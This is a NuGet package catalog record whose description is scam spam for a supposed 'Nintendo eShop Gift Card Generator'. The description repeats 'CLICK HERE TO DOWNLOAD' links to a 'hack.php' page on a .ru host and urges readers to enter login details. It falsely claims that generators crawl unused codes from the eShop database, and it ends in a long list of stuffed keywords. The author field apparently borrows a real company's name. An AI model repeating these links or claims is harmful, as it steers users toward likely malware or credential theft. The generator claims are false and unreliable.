{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.08.10/_nintendo-eshop-gift-card-generator-working-2022-version-zsc.5.6.2.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "1a0c01cd-9938-4303-840c-08223e00b209",
  "catalog:commitTimeStamp": "2022-01-29T00:08:10.3319682Z",
  "created": "2022-01-26T10:35:26.57Z",
  "description": "# _Nintendo eShop Gift Card Generator Working 2022 Version zsc\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://5.bltadwin.ru/hack.php](http://5.bltadwin.ru/hack.php)\n\n\nInput your chosen code to claim your free gift. We'll keep this page up-to-date with all the latest Mystery Gift codes for Brilliant Diamond and. Fortnite Redeem Codes generator website; Enter your login details and click on the Sign-in button. Now your reward code dialogue box will open. Free Nintendo Switch codes generator - You can play these games free of charge by using a Nintendo eShop gift card code generator. The consumer.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://5.bltadwin.ru/hack.php](http://5.bltadwin.ru/hack.php)\n\nGive the gift of fun with a Nintendo eShop Card. These handy cards come in amounts of $10, $20, $35, or $ The Nintendo eShop Cards are a good way to buy new digital games! Free Nintendo eShop Gift Card This gift card generator is undoubtedly one of the strongest generators available. You will receive codes for all Nintendo Wii . Gift Card Code Generator,Free Nintendo eshop Gift Card Code Generator No Human Verification,Free Unused Nintendo eshop Gift Card Codes List. One of the best ways to get your free eShop codes is through free eShop code generator. These generators are basically crawlers that crawl out unused and available eShop codes from eShop database. Just type “free eShop .\n\nnintendo eshop gift card generator 2022, nintendo eshop gift card generator no human verification, nintendo eshop gift card generator 2021 free, nintendo eshop gift card code generator no survey, free nintendo eshop gift card generator, nintendo eshop gift card code generator online, eshop gift card generator unused free nintendo switch codes, free nintendo eshop gift card code generator medialateral, nintendo switch eshop gift card generator, nintendo eshop card generator, nintendo gift card generator, eshop gift card generator, nintendo eshop gift card codes generator, free nintendo eshop gift card codes generator, nintendo 3ds gift card code generator, generate nintendo eshop codes, eshop gift card code generator, nintendo eshop gift card code generator, 3ds eshop gift card generator, nintendo eshop cards free generator, e nintendo gift card, eshop card generator, eshop gift card code, how to get free nintendo eshop gift cards, free nintendo eshop card generator, free nintendo gift card generator, nintendo switch eshop gift card code generator, nintendo eshop card generator no verification, $20 nintendo eshop gift card digital code, my nintendo gift card, get nintendo eshop card, online nintendo eshop code generator, online nintendo eshop gift card, nintendo eshop card code generator, gift eshop credit, gift nintendo eshop credit, gift a nintendo eshop card, what is a nintendo eshop gift card, is there a nintendo gift card, nintendo eshop gift card numbers, nintendo eshop gift card code, nintendo eshop gift cards near me, eshop gift card generator no verification, nintendo eshop card number generator, nintendo eshop prepaid code generator, 10 dollar nintendo eshop card free, $20 nintendo eshop card free, $20 nintendo eshop card code, 5 nintendo eshop card, 5$ nintendo gift card, 5$ nintendo card, 5 dollar nintendo eshop card",
  "id": "_Nintendo-eShop-Gift-Card-Generator-Working-2022-Version-zsc",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:46:38.66Z",
  "listed": false,
  "packageHash": "CeobsfABw982bFXgduNBBXM9c/SlBZedGMNNN2YqrRpzAFaK7p1UmVEkiQ49D+uzCezENvR4DjBiKe/KqIT8Mw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11323,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Nintendo-eShop-Gift-Card-Generator-Working-2022-Version-zsc",
  "verbatimVersion": "5.6.2",
  "version": "5.6.2",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.08.10/_nintendo-eshop-gift-card-generator-working-2022-version-zsc.5.6.2.json#zizewuottt.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1193,
      "fullName": "zizewuottt.nuspec",
      "length": 3779,
      "name": "zizewuottt.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.08.10/_nintendo-eshop-gift-card-generator-working-2022-version-zsc.5.6.2.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9470,
      "fullName": ".signature.p7s",
      "length": 9470,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}